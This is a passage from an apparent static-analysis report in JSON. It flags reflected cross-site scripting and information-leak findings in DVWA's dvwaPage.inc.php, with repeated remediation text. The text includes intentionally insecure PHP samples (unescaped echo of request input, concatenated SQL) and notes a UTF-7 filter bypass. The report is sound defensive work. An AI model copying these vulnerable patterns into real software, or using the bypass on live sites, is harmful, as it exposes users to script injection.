subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4716/?engineType=SCA&issue=E92ADFA22895E54D8A5C1B6A0234C9E0"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4723",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4723/?engineType=SCA&issue=EA5E5A7DF307FCDB9FD40444CC9F0CD7"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4730",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in dvwaPage.inc.php with a call to builtin_echo() on line 345. The information revealed by builtin_echo() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\nIn this case system data or debugging information is produced by get_current_user() and leaked by builtin_echo() in dvwaPage.inc.php on line 345.\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4730/?engineType=SCA&issue=F0A175304EB918A0B9C8ABB2FBCCB798"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4731",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in dvwaPage.inc.php with a call to builtin_echo() on line 345. The information revealed by builtin_echo() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\nIn this case system data or debugging information is produced by get_current_user() and leaked by builtin_echo() in dvwaPage.inc.php on line 345.\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4731/?engineType=SCA&issue=F0A175304EB918A0B9C8ABB2FBCCB799"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4732",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in dvwaPage.inc.php with a call to builtin_echo() on line 345. The information revealed by builtin_echo() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\nIn this case system data or debugging information is produced by get_current_user() and leaked by builtin_echo() in dvwaPage.inc.php on line 345.\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4732/?engineType=SCA&issue=F0A175304EB918A0B9C8ABB2FBCCB79A"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4757",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in dvwaPage.inc.php with a call to builtin_echo() on line 345. The information revealed by builtin_echo() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4757/?engineType=SCA&issue=FC57DD8C54341B1F5D9EBA7F8BD81FEE"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4594",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 355 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 355.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4594/?engineType=SCA&issue=92EF27D624CB8D818985777A959AAAD7"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4457",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 435 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
